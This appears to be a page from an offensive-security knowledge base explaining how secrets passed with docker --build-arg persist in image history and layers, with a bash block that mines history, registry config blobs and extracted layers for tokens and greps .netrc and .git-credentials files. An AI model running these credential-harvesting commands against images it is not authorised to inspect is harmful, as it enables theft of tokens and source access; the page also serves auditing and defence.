---
title: "Build-arg secret leak: credentials that survive in the built image"
description: "Secrets passed to a build with --build-arg are recorded in the image history and are present in the filesystem of any layer that used them. An attacker who can read the resulting image recovers tokens, keys, and passwords that the author passed as build arguments believing they were transient to the build."
keywords:
  - build-arg
  - docker history
  - build secret
  - baked credentials
  - image layers
---

# Build-arg secret leak

Developers often pass a secret into a build with `--build-arg TOKEN=...` to clone a private repository or download a dependency, assuming it vanishes when the build ends. It does not. The `ARG` value is recorded in the image's build history, and any file created with it is in that layer. Anyone who can read the image, from a registry pull or a running container, recovers the secret.

## Recovering the value

```bash
# build history prints the build-arg value in the RUN/ARG step
docker history --no-trunc <image> | grep -iE 'ARG|TOKEN|PASSWORD|KEY'
# the config blob also carries build args and env; via the registry API:
curl -s $R/v2/<repo>/blobs/<config-digest> | jq '.history[].created_by' | grep -i arg
# and any file written with the secret survives in its layer
docker save <image> -o i.tar && tar -xf i.tar -C i && \
  for l in i/*/layer.tar i/blobs/sha256/*; do tar -xf "$l" -C x 2>/dev/null; done
grep -rIE 'token|secret|password' x/root/.netrc x/root/.git-credentials 2>/dev/null
```

The `created_by` field in the config history is literally the command line that ran, including the interpolated build argument, so a `RUN git clone https://$TOKEN@...` exposes the token verbatim.

## Exploitation notes

- `--build-arg` is the leak; the correct build-secret mechanism (`RUN --mount=type=secret`) does not persist, but many images predate or ignore it, so history mining remains productive.
- Check both the history (`created_by`) and the extracted layer filesystem: a token may appear in the command line, in a `.netrc` or `.git-credentials` file, or in a cached download.
- Recovered build credentials often have repository or registry scope that unlocks source code or further images; see [Secrets in image layers](../images-and-registries/secrets-in-image-layers.md) for the general layer-mining workflow.

## References

- [Docker: build secrets vs build args](https://docs.docker.com/build/building/secrets/)
- [Docker: image history](https://docs.docker.com/reference/cli/docker/image/history/)
